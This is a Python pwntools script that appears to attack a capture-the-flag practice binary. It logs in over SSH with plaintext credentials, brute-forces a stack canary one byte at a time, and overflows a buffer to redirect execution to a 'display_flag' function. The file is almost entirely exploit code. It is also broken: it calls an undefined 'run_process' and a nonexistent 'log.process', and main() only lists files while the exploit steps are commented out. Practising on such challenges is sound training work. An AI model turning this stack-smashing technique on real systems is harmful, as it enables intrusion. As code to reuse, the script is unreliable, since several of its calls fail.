from pwn import *

ARCH = "i386"
FILE = "./vuln"
HOST = "3.15.247.173"

USER = "kfukuta"
PASS = "qwe123qwe"

DIR = "/problems/reverse-cipher_2_d8dc36eefa9dfce00eac3dab8f42513c"

SSH = ssh(host=HOST, user=USER, password=PASS)
SSH.set_working_directory(DIR)


def leak_canary():
    buf_size = 32
    canary = b''
    for i in range(4):
        for c in range(0xff):
            payload = b'A' * buf_size + canary + bytes([c])
            log.info("leak_canary_payload: {}".format(payload))
            con = run_process()
            con.sendlineafter("Please enter the length of the entry:\n> ", str(buf_size + i + 1))
            con.sendlineafter("Input> ", payload)
            res = con.recvall()
            if b"Canary Value Corrupt!" not in res:
                canary += bytes([c])
                break
    return canary


def exploit(canary):
    elf = ELF(FILE)
    while True:
        con = run_process()
        display_flag = elf.symbols[b"display_flag"]
        log.info("display_flag: {}".format(hex(display_flag)))

        buf_size = 32
        padding = b"B" * 16
        payload = b"A" * buf_size + canary + padding + display_flag.to_bytes(2, "little")
        log.info("payload: {}".format(payload))
        con.sendlineafter("Please enter the length of the entry:\n> ", str(len(payload)))
        con.sendlineafter("Input> ", payload)
        con.readuntil("\n")
        res = con.recvall()
        if b"pico" in res:
            return res.decode("utf-8")


def main():
    context(arch=ARCH, os="linux")

    prog = log.process("test")
    context.log_level = "error"

    log.info("test")
    con = SSH.process(["ls"])
    # con.sendlineafter("Please enter the length of the entry:\n> ", str(buf_size + i + 1))
    # con.sendlineafter("Input> ", payload)
    res = con.recvall()
    print(res)

    context.log_level = "info"
    prog.success("done")

    # prog = log.progress("leak_canary()")
    # context.log_level = "error"
    # canary = leak_canary()
    # context.log_level = "info"
    # prog.success("canary: {}".format(canary))
    #
    # prog = log.progress("exploit()")
    # context.log_level = "error"
    # flag = exploit(canary)
    # context.log_level = "info"
    # prog.success("flag: {}".format(flag))


if __name__ == "__main__":
    main()
